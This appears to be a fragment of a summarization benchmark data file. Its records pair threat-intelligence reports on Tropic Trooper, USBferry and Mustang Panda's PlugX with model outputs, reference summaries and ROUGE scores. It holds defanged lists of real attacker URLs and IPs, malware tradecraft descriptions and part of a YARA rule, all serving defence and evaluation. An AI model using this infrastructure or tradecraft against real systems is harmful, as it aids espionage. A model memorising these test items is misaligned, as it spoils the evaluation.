kong[.]24[.]jpg hxxp://113[.]10[.]221[.]89 / images / kong[.]24[.]jpg hxxp://61[.]221[.]169[.]31 / images / kongj[.]24[.]jpg hxxp://www[.]forensic611[.]3 - a[.]net / monitor / images / Smarp140102[.]24[.]gif [ORG] hxxp://www[.]bannered[.]4dq[.]com / monitor / images / Smarp140102[.]24[.]gif hxxp://www[.]forensic[.]zyns[.]com / monitor / images / Smarp140102[.]24[.]gif hxxp://113[.]10[.]221[.]89 / Pictures / sbsb_0620[.]24[.]jpg hxxp://bbs[.]ccdog[.]net / Pictures / sbsb_0620[.]24[.]jpg hxxp://www[.]forensic611[.]3 [ORG] - a[.]net / monitor / images / Smartzh131225[.]24[.]gif hxxp://www[.]bannered[.]4dq[.]com / monitor / images / Smartzh131225[.]24[.]gif hxxp://www[.]forensic[.]zyns[.]com / monitor / images / Smartzh131225[.]24[.]gif hxxp://bbs[.]zzbooks[.]net / Pictures / lclc_0523[.]24[.]jpg hxxp://bbs[.]ccdog[.]net / Pictures / lclc_0523[.]24[.]jpg hxxp://113[.]10[.]221[.]89 / Pictures / lclc_0523[.]24[.]jpg hxxp://50[.]117[.]38[.]164 / Pictures / dzh_0925[.]24[.]jpg hxxp://www[.]cham[.]com[.]tw / images / [ORG] dzh_0925[.]24[.]jpg hxxp://113[.]10[.]221[.]89 / Pictures / [ORG] dzh_0925[.]24[.]jpg hxxp://bbs[.]ccdog[.]net / Pictures / jpg_140430[.]24[.]jpg hxxp://198[.]100[.]122[.]66 / Pictures / jpg_140430[.]24[.]jpghxxp://192[.]69[.]221[.]92 / Pictures / jpg_140430[.]24[.]jpg [ORG] hxxp://www[.]bannered[.]4dq[.]com / monitor / images / SmartNav141216[.]64[.]gif hxxp://www[.]amberisic611[.]4dq[.]com / monitor / images / SmartNav141216[.]64[.]gif hxxp://www[.]metacu[.]ygto[.]com / monitor / images / SmartNav141216[.]64[.]gif hxxp://www[.]metacu[.]ygto[.]com / monitor / images / SmartNav141216[.]32[.]gif hxxp://www[.]amberisic611[.]4dq[.]com / monitor / images / SmartNav141216[.]32[.]gif [ORG] hxxp://www[.]bannered[.]4dq[.]com / monitor / images / SmartNav141216[.]32[.]gif hxxp://bbs[.]ccdog[.]net / Pictures/20150120 - hex[.]64[.]jpg hxxp://23[.]27[.]112[.]216 / Pictures/20150120 - hex[.]64[.]jpg hxxp://bbs[.]zzbook[.]net / Pictures/20150120 - hex[.]64[.]jpg hxxp://bbs[.]zzbook[.]net / Pictures/20150120 - hex[.]32[.]jpg hxxp://23[.]27[.]112[.]216 / Pictures/20150120 - hex[.]32[.]jpg hxxp://bbs[.]ccdog[.]net / Pictures/20150120 - hex[.]32[.]jpg hxxp://bbs[.]ccdog[.]net / Pictures / h20141212012[.]64[.]jpg hxxp://23[.]27[.]112[.]216 / Pictures / h20141212012[.]32[.]jpg hxxp://113[.]10[.]221[.]89 / Pictures / h20141212012[.]32[.]jpg hxxp://bbs[.]ccdog[.]net / Pictures / h20141212012[.]32[.]jpg hxxp://113[.]10[.]221[.]89 / Pictures / ooba_0823[.]24[.]jpg hxxp://198[.]100[.]122[.]66 / Pictures / ooba_0823[.]24[.]jpg hxxp://50[.]117[.]38[.]164 / Pictures / ooba_0823[.]24[.]jpg hxxp://www[.]metacu[.]ygto[.]com / monitor / images / SmartNav0120[.]64[.]gif hxxp://www[.]amberisic611[.]4dq[.]com / monitor / images / SmartNav0120[.]64[.]gif [ORG] hxxp://www[.]bannered[.]4dq[.]com / moitor / images / SmartNav0120[.]64[.]gif [ORG] hxxp://www[.]bannered[.]4dq[.]com / moitor / images / SmartNav0120[.]32[.]gif hxxp://www[.]metacu[.]ygto[.]com / monitor / images / SmartNav0120[.]32[.]gif hxxp://www[.]amberisic611[.]4dq[.]com / monitor / images / SmartNav0120[.]32[.]gif [ORG] hxxp://www[.]dpponline[.]trickip[.]org / images / D2015_id[.]jpg hxxp://223[.]27[.]35[.]244 / images / D2015_id[.]jpg hxxp://www[.]myinfo[.]ocry[.]com / images / D2015_id[.]jpg hxxp://49[.]254[.]211[.]75//tedws/1[.]64[.]jpg hxxp://107[.]183[.]183[.]235 / public/1[.]64[.]jpg hxxp://49[.]254[.]211[.]75//tedws/1[.]32[.]jpg hxxp://107[.]183[.]183[.]235 / public/1[.]32[.]jpg hxxp://\ufb02anando[.]fartit[.]com/2015 / p1[.]64[.]jpg   hxxp://\ufb02anando[.]fartit[.]com/2015 / p1[.]32[.]jpg Got something to say?Leave a comment [GPE] Notify me of followup comments via e - mailName ( [PERSON] required)Email ( required)WebsiteWebsiteSUBMITSUBSCRIBE TO [PERSON] NEWSLETTERSEmailCOMPANY [PERSON] Report a [ORG] VulnerabilityLEGAL [ORG] NOTICES [ORG] Privacy [ORG] Policy [ORG] Terms of [ORG] UseACCOUNT [ORG] Manage [ORG] Subscription \u00a9 2016 [ORG] Palo [ORG] Alto [ORG] Networks , [ORG] Inc. All rights reserved . SALES > 866.320.4788SEE A DEMOTAKE A TEST DRIVESUBSCRIBE", "generated_text": "The attacks; Tropic Trooper; the Taiwanese Government; at least 2011; an energy sector company; the spear; phishing emails; a staff member; the Democratic Progressive Party; The document; CVE-2012-0158; Office; the decoy document; a spreadsheet; protestor activity; the document; the macros; the attack; a decoy document; a USB drive; the decoy; the CVE-2012-0158 vulnerability; the attack; the Poison Ivy RAT; part; their toolkit; ties; the PCShare malware family; the group; the group.", "ref_text": "<START-1>The report from Palo Alto Networks details attacks by a threat actor group called Tropic Trooper, which has been active since at least 2011 targeting organizations in Taiwan and other Asia Pacific countries. Tropic Trooper typically uses spearphishing emails containing exploits to deliver malware like Yahoyah. The report confirms they also use Poison Ivy and possibly PCShare malware. In August 2016, Tropic Trooper targeted Taiwan's Executive Yuan government office and a fossil fuel company with spearphishing using weaponized Office documents exploiting CVE-2012-0158. The malware payload was Poison Ivy configured to communicate with command and control servers typically hacked third party systems. The decoy document contained content related to Taiwanese political and activist movements. Infrastructure analysis uncovered ties between Yahoyah, Poison Ivy, and PCShare malware used by Tropic Trooper. The group actively maintains and reuses malware and exploits over time. Tropic Trooper appears to be a persistent, organized threat group focused on targets in Taiwan and the Asia Pacific region. Their tactics rely on social engineering and known exploits rather than zero-days. Protection measures against Tropic Trooper include blocking their infrastructure, preventing Office exploit delivery, behavioral analysis to detect malware execution, and other threat prevention techniques. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.36666666666666664, "gpt3/lexical/rouge_rouge2": 0.08724832214765102, "gpt3/lexical/rouge_rougeL": 0.21333333333333335, "gpt3/lexical/rouge_rougeLsum": 0.21333333333333335, "gpt3_generated_text": ["The article discusses recent cyber attacks on the Taiwanese Government and an energy sector company by a group known as Tropic Trooper. The attacks, which date back to at least 2011, utilized spear phishing emails and the deployment of the Poison Ivy RAT. The attackers also used a decoy document, a spreadsheet documenting protestor activity, to trick victims into thinking it was legitimate. Further analysis revealed ties to the PCShare malware family, which had not been previously associated with the group. The article provides details on the techniques used in the attacks and highlights the ongoing threat posed by Tropic Trooper."]}, {"split_name": "val", "sample_id": "val_24", "prompt_text": "Extract the keywords: [CARDINAL] 5/14/2020Tropic Trooper \u2019s Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security Intelligence BlogTrend Micro About TrendLabs Security Intelligence BlogSearch : Home CategoriesHome \u00bb Malware \u00bb Tropic Trooper \u2019s Back : USBferry Attack Targets Air - gapped [ORG] EnvironmentsTropic [ORG] Trooper \u2019s [ORG] Back : USBferry Attack Targets Air - gapped [ORG] EnvironmentsPosted on : [DATE] May 12 , [DATE] 2020 at [TIME] 5:18 [TIME] am [TIME] Posted in : Malware , [ORG] Targeted [ORG] Attacks Author : Trend Micro0By [PERSON] Joey [PERSON] Chen ( [PERSON] Threats [PERSON] Analyst ) [ORG] Tropic [ORG] Trooper , a threat actor group that targets government , military , healthcare , transportation , and high - tech industries in [GPE] Taiwan , the [GPE] Philippines , and [GPE] Hong [GPE] Kong , has been active since [DATE] 2011 . The group was reportedly using spear - phishing emails with weaponized attachments to exploit known vulnerabilities . Primarily motivated by information theft and espionage , the group has also been seen adopting different strategies such as \ufb01ne - tuning tools with new behaviors and going mobile with surveillanceware . We found that [ORG] Tropic [ORG] Trooper \u2019s latest activities center on targeting [LANGUAGE] Taiwanese and the [NORP] Philippine military \u2019s physically isolated networks through a [GPE] USBferry attack ( the name derived from a sample found in a related research ) . We also observed targets among military / navy agencies , government institutions , military hospitals , and even a national bank . The group employs USBferry , a [ORG] USB malware that performs different commands on speci\ufb01c targets , maintains stealth in environments , and steals critical data through [ORG] USB storage . We started tracking this particular campaign in [DATE] 2018 , and our analysis shows that it uses a fake executable decoy and a [ORG] USB trojan strategy to steal information . Based on data from the Trend Micro \u2122 Smart Protection Network \u2122 security infrastructure , USBferry attacks have been active since [DATE] 2014 . We found the group was focused on stealing defense- , ocean- , and ship - related documents from target networks , which led us to believe that [ORG] Tropic [ORG] Trooper \u2019s main purpose is to ex\ufb01ltrate con\ufb01dential information or intelligence.url [ORG] Trooper \u2019s Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security [ORG] Intelligence BlogFigure 1 . A sample scenario of the USBferry attackTropic [ORG] Trooper is well aware that military or government organizations may have more robust security in their physically isolated environments ( i.e. , the use of biometrics or [ORG] USB use in a quarantined machine before an air - gapped environment ) . The group then targets potentially unsecured related organizations that could serve as jumping - off points for attacks . For instance , we observed [ORG] Tropic [ORG] Trooper move from a military hospital to the military \u2019s physically isolated network . This blog post provides an overview of the [ORG] USB malware called [ORG] USBferry and its capabilities , as well as the other tools used to in\ufb01ltrate physically isolated environments . Further details , including indicators of compromise ( IoCs ) , can be read in the technical brief . A [ORG] USB malware called USBferry We \ufb01rst encountered the malware from a [ORG] PricewaterhouseCoopers report that mentioned a sample related to [ORG] Tropic [ORG] Trooper but did not include a detailed analysis . We looked into it further and discovered many versions of it , including several program database ( [ORG] PDB ) strings . For [CARDINAL] one thing , the [GPE] USBferry malware already has [CARDINAL] at [CARDINAL] least [CARDINAL] three versions , with different variants and components , at the time of writing . Here are the noteworthy points we gathered during analysis : The \ufb01rst version has a small component of TROJ_YAHOYAH . The malware tries to check if the target machine has a [ORG] USB plug - in and copies the USBferry installer into the [ORG] USB storage . The activities vary in target environments ; some execute commands , source target \ufb01les or folder lists , and copy \ufb01les from physically isolated hosts to compromised hosts , among other things . Figure [CARDINAL] 2 . USBferry malware \u2019s \ufb01rst version , where the [ORG] EXE \ufb01le is the [GPE] USBferry malware and the [ORG] DLL \ufb01le is trojan TROJ_YAHOYAHThe [ORDINAL] second version has the same capabilities as the \ufb01rst and combines components into one executable . This version also changes the malware location and its name to [ORG] UF , an abbreviation for [ORG] USBferry . The [ORDINAL] third version retains the previous versions \u2019 capabilities and improves its stealth in the target environment by residing in the rundll32.exe memory . Figure [CARDINAL] 3 . USBferry malware \u2019s [ORDINAL] second version combined into [CARDINAL] one \ufb01leurl [ORG] Trooper \u2019s [ORG] Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security [ORG] Intelligence BlogFigure 4 . USBferry malware \u2019s [ORDINAL] third version becomes resident in memoryHow USBferry targets air - gapped systems In our technical brief , we broke down how [ORG] Tropic [ORG] Trooper has changed the way it uses the abovementioned USBferry versions in attacks . The group achieves infection by employing the [ORG] USB worm infection strategy and ferrying a malware installer via [ORG] USB into an air - gapped host machine . Here we will discuss the notable changes in the group \u2019s latest attack chain that uses version UF1.0 20160226 ( detected by [ORG] Trend [ORG] Micro as TROJ_USBLODR.ZAHB- A):Figure 5 . USBferry malware using [ORG] USB worm infection strategyFigure [CARDINAL] 6 . USBferry attack scenario , version UF1.0 [CARDINAL] 201602261 . The decoy \ufb01le \ufb01rst drops a \ufb02ash_en.inf [ORG] DLL \ufb01le , which is a USBferry loader , and tries to load the encrypted USBferry malware [CARDINAL] 2 . The encrypted USBferry malware is embedded in the loader resource section , and the loader drops it into the C:\\Users\\Public\\Documents\\Flash folder and [CARDINAL] 3 . After the encrypted payload is loaded , the loader injects a malicious [ORG] DLL into rundll32.exe . The [GPE] USBferry malware also loads a [ORG] C&C con\ufb01guration \ufb01le and [CARDINAL] 4 . The USBferry malware then tries to connect to the download site and uses a Windows command to collect / copy target host datanames it \ufb02ash.dat \ufb02ash_en.dat , which is also located in the C:\\Users\\Public\\Documents\\FlashThis version checks for network connectivity ; if it \ufb01nds that the network is unavailable , it tries to collect information from the target machine and copy the collected data into [ORG] USB storage . This way , the [ORG] USB ex\ufb01ltrates the information and sends it back to the [ORG] C&C server . Backdoors and other tools used by [ORG] Tropic [ORG] Trooper [ORG] Some backdoors used by [ORG] Tropic [ORG] Trooper use injection to execute its routines , while others execute directly and run itself consistently . The group also uses steganography to mask their backdoor routines and evade anti - malware and network perimeter detection . To \ufb01nd the full list of the backdoors we analyzed , check out our technical brief . Here we will tackle some of the noteworthy backdoors [ORG] Tropic [ORG] Trooper used . WelCome To Svchost 3.2 20110818 \u2019s backdoor ( detected as BKDR_SVCSHELL.ZAHC - A ) \u2013 This backdoor bears similarities with a payload we discussed in our previous research . Based on the malware version number , this backdoor \u2019s \ufb01rst version was developed in or before [DATE] 2011 . This means that [ORG] Tropic [ORG] Trooper \u2019s activities have been ongoing for [DATE] at [DATE] least [DATE] ten [DATE] years now.url [ORG] Trooper \u2019s [ORG] Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security [ORG] Intelligence [ORG] BlogFigure [ORG] 7 . The backdoor version name , registered service name , and malware components \u2019 \ufb01lenamesWelcome To [ORG] IDShell 1.0 20150310 \u2019s backdoor ( detected as BKDR_IDSHELL.ZTFC - A ) \u2013 The purpose of this backdoor , which has [CARDINAL] two types , including a steganography jpg version , is to recon the target machine . Like other versions , it uses the [ORG] DNS protocol to communicate with the backdoor controller . The traf\ufb01c is encrypted to evade detection . Hey ! Welcome Server [CARDINAL] 2.0 \u2019s backdoor ( detected as BKDR_TEBSHELL.ZTGK ) \u2013 This is the latest version of the backdoor , available in 32 [QUANTITY] - bit and [CARDINAL] 64 - bit versions , which uses an invisible web shell for remote control and network security evasion . It runs the process as a service , hides backdoor communication in normal traf\ufb01c , and uses customized TCP protocol . It also improves the way it handles wrong input commands and unauthorized access . Figure [CARDINAL] 8 . The backdoor \u2019s communication traf\ufb01cFigure [CARDINAL] 9 . The executable version will install and name it as a Windows service , change registry to disable error display , and launch the serviceTropic [ORG] Trooper also used other tools in their attacks , such as : Command - line remote control listener / port relay tool , which has different versions that can communicate with the backdoor . Backdoor payload / steganography payload execution loaders , which have [CARDINAL] two versions that can be used to successfully load the encrypted payload and subsequently delete itself and the payload . Port scanning tools , which are available on the internet . The overview provided above highlights how putting critical information in physically isolated networks is not a bulletproof solution for defending against cyberespionage . [PERSON] Steganography is n\u2019t just used to deliver encrypted payloads ; it can also be used to transfer information to a [ORG] C&C server . Multiple hacking tools and components can also help facilitate successful attacks on different networks and environments . Threat actors like [ORG] Tropic [ORG] Trooper can also use an invisible web shell to hide its [ORG] C&C server location and make incident response tricky . MITRE ATT&CK Matrixurl Trooper \u2019s Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security Intelligence BlogBest practices and [ORG] Trend [ORG] Micro solutions The latest developments with [ORG] Tropic [ORG] Trooper indicate that they are well - prepared to target government institutions and military agencies for stolen intelligence . The group also takes a long time to perform reconnaissance and consequently in\ufb01ltrate physically isolated networks . This research also underscores how threat actors could see potentially vulnerable targets as launch points for extending their attack attempts to other , more critical targets . Understanding attack tactics and techniques can provide the needed context for assessing potential impact and adopting defensive strategies . Here are some measures that organizations can practice to thwart advanced persistent threats with security that employs actionable threat intelligence , network - wide visibility , and timely threat protection : Enforce the principle of least privilege . Employ network segmentation and data categorization to deter lateral movement and mitigate exposure . Keep the system and its applications up - to - date . Weaknesses in the network can serve as entry points for attacks . Enforce a strong patch management policy and consider virtual patching for legacy systems . Regularly monitor your perimeter . Adopt cross - layer detection and response across gateways , endpoints , networks , and servers to protect against a wide range of cybersecurity threats . Firewalls and intrusion detection and prevention systems can help defend against network - based [ORG] attacks.url [ORG] Trooper \u2019s [ORG] Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security [ORG] Intelligence [ORG] Blog5/14/2020 [ORG] Organizations can take advantage of [ORG] the [ORG] Trend [ORG] Micro [ORG] Apex [ORG] One \u2122 solution , which provides actionable insights , expanded investigative capabilities , and centralized visibility across the network through a variety of threat detection capabilities such as behavioral analysis that protects against malicious scripts , injection , ransomware , memory , and browser attacks . A multilayered security solution such as [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Discovery \u2122 can also be considered ; it provides in - depth analysis and proactive response to attacks using exploits and other similar threats through specialized engines , custom sandboxing , and seamless correlation across the entire attack lifecycle , allowing it to detect these attacks even without any engine or pattern updates . Read our technical brief , which discusses in full our analyses of [ORG] Tropic [ORG] Trooper \u2019s recent activities , the [GPE] USBferry malware , and IoCs . Related Posts : Operation ENDTRADE : Finding Multi - Stage Backdoors that TICK MuddyWater Resurfaces , [ORG] Uses Multi [ORG] - Stage [ORG] Backdoor [ORG] POWERSTATS [ORG] V3 and [ORG] New Post [ORG] - Exploitation [ORG] Tools [ORG] Shifting [ORG] Tactics : Breaking Down TA505 Group \u2019s Use of HTML , RATs and Other Techniques in [GPE] Latest Campaigns [ORG] Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in [ORG] CampaignsLearn how to protect Enterprises , [ORG] Small [ORG] Businesses , and [PERSON] Home [PERSON] Users from ransomware : ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags : cyberespionageKeyBoymilitaryUSBUSBferry0 CommentsTrendLabs [ORG] \ud83d\udd12 [ORG] Privacy [ORG] PolicyRecommend\uf108t [ORG] Tweet f ShareLogin\ue6031 Sort by [ORG] BestStart the discussion \u2026 [ORG] LOG IN [ORG] WITHOR SIGN UP WITH DISQUS?SubscribeAdd Disqus to your siteAdd DisqusAddd \u2709 Security Predictions for 2020D N t S ll M D t \u26a0 [ORG] Cybersecurity in [DATE] 2020 will be viewed through many lenses \u2014 from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence \u2014 only so defenders can keep up with the broad range of threats . Read our security predictions for [CARDINAL] 2020.Business Process CompromiseAttackers are starting to invest in long - term operations that target speci\ufb01c processes enterprises rely on . They scout for vulnerable practices , susceptible systems and operational loopholes that they can leverage or abuse . To learn more , read our Security 101 : [ORG] Business [ORG] Process [ORG] Compromise . Recent PostsMay Patch [DATE] Tuesday : More [ORG] Fixes [ORG] for [ORG] SharePoint , [ORG] TLS , Runtime , and [ORG] Graphic [ORG] Components Released [ORG] Tropic [ORG] Trooper \u2019s [ORG] Back : USBferry Attack Targets Air - gapped [PERSON] Environments [PERSON] New [PERSON] MacOS Dacls RAT Backdoor Show Lazarus \u2019 Multi - Platform Attack Capability Targeted Ransomware Attack Hits [NORP] Taiwanese Organizations WebMonitor RAT Bundled with Zoom InstallerPopular Posts url [ORG] Trooper \u2019s Back : USBferry Attack Targets Air - gapped [ORG] Environments [ORG] - [ORG] TrendLabs [ORG] Security Intelligence BlogExposed Redis Instances Abused for Remote Code Execution , Cryptocurrency Mining WebMonitor RAT Bundled with Zoom Installer Exposing Modular Adware : How DealPly , [NORP] IsErIk , and ManageX [ORG] Persist [ORG] in [ORG] Systems Coronavirus Update App Leads to Project Spy Android and [FAC] iOS [FAC] Spyware New MacOS Dacls RAT Backdoor Show Lazarus \u2019 Multi - Platform Attack CapabilityStay Updated Email SubscriptionHome and [ORG] Home [ORG] Of\ufb01ce About Trend Micro Asia Paci\ufb01c Region ( [ORG] APAC ): [GPE] Australia / [GPE] New [GPE] Zealand , , [GPE] \u2f47 , \ub300\ud55c\ubbfc\uad6d ,   [LOC] Latin [LOC] America [LOC] Region ( LAR ): Brasil , [PERSON] M\u00e9xico [PERSON] North America Region ( [ORG] NABU ): [GPE] United [GPE] States , [LOC] Canada [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schweiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom / Ireland Copyright \u00a9 [DATE] 2020 Trend Micro Incorporated . All rights reserved.url", "generated_text": "PDF; a USB malware; USBferry; targets; Taiwanese; the Philippines; Hong Kong; 2011; spear-phishing emails; vulnerability; knowledge; theft; espionage; a USB decoy; a USB trojan; stealth; data; USB storage; device; the USB; USB drives; command; control; addition; tools; the USB; IP; a C2; the attacker; targets; unsecured organizations; the threat actor group; the group; indicators.", "ref_text": "<START-1>The PDF discusses attacks by a threat actor group called Tropic Trooper that targets government, military, and other organizations in Taiwan, the Philippines, and Hong Kong. - Tropic Trooper has been active since at least 2011, using spear phishing and weaponized attachments to steal information. - Their latest campaign uses a type of USB malware called USBferry to target air-gapped networks of military and government organizations. - USBferry infects air-gapped systems by copying itself to USB devices that are then inserted into the isolated systems. It can collect files and data from the air-gapped system and transfer them out when the USB device is removed. - There are at least three versions of USBferry that have different capabilities for evading detection, executing commands, etc. The latest version resides in memory to hide itself. - Tropic Trooper first compromises related organizations like military hospitals to use as a jumping off point to get to the more secure air-gapped networks. - They have a variety of custom backdoors and tools to maintain access, communicate with compromised systems, scan networks, etc. Some use steganography to hide communications. - Recommendations include enforcing least privilege, keeping systems patched and updated, monitoring networks, and using security solutions that provide visibility and threat detection across the environment. Understanding the tactics and techniques of threat actors can help organizations better defend against targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.48958333333333337, "gpt3/lexical/rouge_rouge2": 0.1256544502617801, "gpt3/lexical/rouge_rougeL": 0.27083333333333337, "gpt3/lexical/rouge_rougeLsum": 0.27083333333333337, "gpt3_generated_text": ["The article discusses the activities of the threat actor group Tropic Trooper, which has been active since 2011 and targets various industries in Taiwan, the Philippines, and Hong Kong. The group primarily focuses on information theft and espionage and has recently been using a USBferry attack to target physically isolated networks of the Taiwanese and Philippine military. USBferry is a USB malware that performs different commands on specific targets, maintains stealth in environments, and steals critical data through USB storage. The group is aware that military and government organizations have robust security in their physically isolated environments, so they target potentially unsecured related organizations to serve as jumping-off points for attacks. The article provides an overview of USBferry and its capabilities, as well as other tools used by Tropic Trooper to infiltrate physically isolated environments. The article also mentions that USBferry attacks have been active since 2014 and that the group focuses on stealing defense, ocean, and ship-related documents."]}, {"split_name": "val", "sample_id": "val_25", "prompt_text": "Extract the keywords: blogs.blackberry.com /en/2022/10 / mustang - panda - abuses - legitimate - apps - to - target - myanmar - based - victims [PERSON] Mustang [PERSON] Panda Abuses Legitimate Apps to Target Myanmar Based Victims [ORG] The [ORG] BlackBerry [ORG] Research [ORG] & [ORG] Intelligence [ORG] Team \u22ee \u22ee [CARDINAL] 10/6/2022Executive [ORG] SummaryThe [ORG] BlackBerry [ORG] Research [ORG] & [ORG] Intelligence [ORG] Team recently uncovered a campaign by an advanced persistent threat ( [ORG] APT ) group called [PERSON] Mustang [PERSON] Panda that is leveraging the [LOC] PlugX malware family to target the [NORP] Southeast [NORP] Asian state of [GPE] Myanmar . Our team analyzed the samples in question and found their embedded configurations revealed a set of command- and - control ( C2 ) domains that masquerade as [GPE] Myanmar news outlets . This is not the [ORDINAL] first time a campaign targeting this state has impersonated [GPE] Myanmar news outlets or used [FAC] PlugX malware . These tactics , techniques , and procedures ( TTPs ) , along with other corroborating evidence \u2013 such as a previous indication that the group was active in this location \u2013 lead us to assert with reasonable confidence that the China- based threat group known as [PERSON] Mustang [PERSON] Panda is responsible for this campaign [PERSON] Mustang [PERSON] Panda : an Origin StoryMustang Panda ( aka [ORG] HoneyMyte , [GPE] Bronze President or [LOC] Red [LOC] Delta ) is a prolific [ORG] APT group that has been publicly attributed as being based in [GPE] China . This group conducted malware campaigns as far back as [DATE] 2012 , which primarily related to cyber - espionage . Their targets have included Government and Non - Government [ORG] Organizations ( NGO ) in many locations around the world , from various states in [LOC] Southeast [LOC] Asia to [ORG] the [ORG] European [ORG] Union to the [GPE] U.S. and beyond.1/6Figure 1 \u2013 Partial map of countries previously targeted by [PERSON] Mustang [PERSON] PandaMustang Panda [PERSON] Attack [PERSON] VectorMustang [PERSON] Panda typically sends phishing emails with malicious document attachments as an initial infection vector . These documents are usually designed to mimic those of the targeted country or organization , or even current world affairs applicable to that region . Once threat actors gain a foothold within a target organization , they typically deploy [CARDINAL] one of a variety of payloads such as [PERSON] Cobalt [PERSON] Strike , Poison Ivy , or PlugX , the latter of which is used most extensively . Initial [GPE] ThreadIn [DATE] late [DATE] May [DATE] of [DATE] this [DATE] year , [ORG] BlackBerry detected some unusual network traffic to a domain \u2013 www[.]myanmarnewsonline[.]org . At [ORDINAL] first glance , this URL appeared to be a [GPE] Myanmar news website . The files found to be communicating with this site were encompassed in several .RAR files . These files had a relatively low detection ratio on [ORG] VirusTotal ( [GPE] VT ) , and as shown in Figure [CARDINAL] 2 , they followed a naming convention designed to make them appear to be legitimate utilities relating to Hewlett - Packard ( HP ) printers . Figure [CARDINAL] 2 \u2013 Communicating RAR filesThe RAR archives contained a legitimate signed utility from HP , along with a [ORG] DLL loader and a DAT file that is an encrypted PlugX payload . [CARDINAL] One of the legitimate utilities ( \u201c HPCustParticUI.exe \u201d \u2013 SHA256 fashion as part of a PlugX execution chain , which was documented by another vendor in [DATE] September [DATE] 2021.In [DATE] early [DATE] June [DATE] of [DATE] this [DATE] year , a tweet from the user [PERSON] @kienbigmummy ( shown in Figure [CARDINAL] 3 ) mentioned an additional .RAR file titled \u201c service Log.rar \u201d that was linked with a sub - domain of the previously mentioned website \u2013 images[.]myanmarnewsonline[.]org \u2013 that was associated with PlugX and the Mustang Panda APT group.2/6Figure [CARDINAL] 3 \u2013 [DATE] June [DATE] 2nd PlugX tweet by [ORG] @kienbigmummyWe examined the network infrastructure ( shown in Figure [CARDINAL] 4 ) linked to each of these [CARDINAL] three [ORG] RAR files , which provided evidence of additional samples that conform to the same or similar TTPs going back as far as late 2020 , along with other sample types such as Cobalt Strike beacon . Figure [CARDINAL] 4 \u2013 VirusTotal graph of network infrastructureWhat is PlugX?PlugX is a remote access tool ( RAT ) used by several threat groups . It is the malware of choice for the [NORP] Chinese [ORG] APT group [PERSON] Mustang [PERSON] Panda . This group delivers the PlugX implant in the form of an encrypted data blob , which is typically paired with a [ORG] DLL loader as well as a benign application . This actor has commonly employed the stealthy technique of side - loading the malicious DLLs into legitimate applications during execution . This action then deploys the PlugX implant into memory . We noted threat actors had used [CARDINAL] three separate legitimate applications within our [ORG] RAR files ; A free VPN service , and [CARDINAL] two legitimate HP applications related to HP \u2019s [ORG] Digital [ORG] Imaging . Each legitimate application was bundled with a [ORG] DLL and a data file . In [CARDINAL] two out of the [CARDINAL] three [ORG] RAR files , the DAT file masqueraded as a different file format , such as JSON or CHM.3/6Upon execution of the legitimate application , the threat loads a malicious [ORG] DLL loader in a specific set order , which the threat actor has strategically placed in the same folder to replace a legitimate one . This proceeds to side - load the [ORG] DLL by abusing the [ORG] DLL search order , which is a technique also known as [ORG] DLL [ORG] Search [ORG] Order [ORG] Hijacking . The malicious [ORG] DLL is then loaded into the legitimate application , where it decrypts , loads and deploys the malicious PlugX implant . This execution chain is shown in Figure [CARDINAL] 5.Figure 5 \u2013 PlugX side - loading execution chain Technical AnalysisThe [ORG] DLL loader is heavily obfuscated and employs dynamic API resolution upon runtime . It retrieves a handle to the encrypted PlugX implant , then reads the data into a newly allocated region within memory . Execution is then passed to the implant , where the shellcode is executed , and it XOR decrypts the embedded payload , as shown in Figure [CARDINAL] 6 . Once decryption is complete , [PERSON] RtlDecompressBuffer is called to decompress the decrypted payload to its final form as shown in Figure [CARDINAL] 7.Figure 6 \u2013 Decryption routine4/6Figure 7 \u2013 Decrypted payload header [PERSON] ConclusionMustang [PERSON] Panda , which is publicly known as a [NORP] Chinese - affiliated [ORG] APT group , has an established history of using the [LOC] PlugX malware and targeting nations throughout South - East [LOC] Asia . This threat actor has been previously linked to campaigns targeting [GPE] Myanmar government entities using custom lures and compromising the website of the office of [GPE] Myanmar \u2019s president . The TTPs associated with the campaign covered in this report align with those of [PERSON] Mustang [PERSON] Panda . We observed a typical attack chain employed by the group , where attackers used a benign executable to side - load a malicious [ORG] DLL loader , which then decrypts and loads the PlugX implant . We have also confirmed the [CARDINAL] C2 infrastructure associated with this campaign has been used to target entities in [GPE] Myanmar , including a government VPN portal , from [DATE] early [DATE] March onwards . Indicators of Compromise ( IoCs ) FileSHA256 ColorLaserJet.rarNetworkDescriptionencompassing a legit signed utility + a [ORG] DLL a legit signed utility + a [ORG] DLL a legit signed utility + a [ORG] DLL Update[.]hilifimyanmar[.]com Download[.]hilifimyanmar[.]com Domain Images[.]myanmarnewsonline[.]orgDomain www[.]myanmarnewsonline[.]org Domain 154[.]204[.]26[.]120 45[.]134[.]83[.]4 Defense Yara Rule for [GPE] Mustang PandaIP C&Crule targeted_MustangPanda_dll { meta : description = \" Rule to detect malicious [ORG] DLL originally used to target [GPE] Myanmar \" author = \" [ORG] The [ORG] BlackBerry [ORG] Research [ORG] & [ORG] Intelligence team \" version = \" [CARDINAL] 1.0 \" last_modified = \" 2022 - 08 - 02 \" license = \" This [PERSON] Yara rule is provided under [LAW] the [LAW] Apache [LAW] License [LAW] 2.0 ( url and open or organization , as long as you use it under this license and ensure originator credit in any derivative to [ORG] The [ORG] BlackBerry [ORG] Research [ORG] 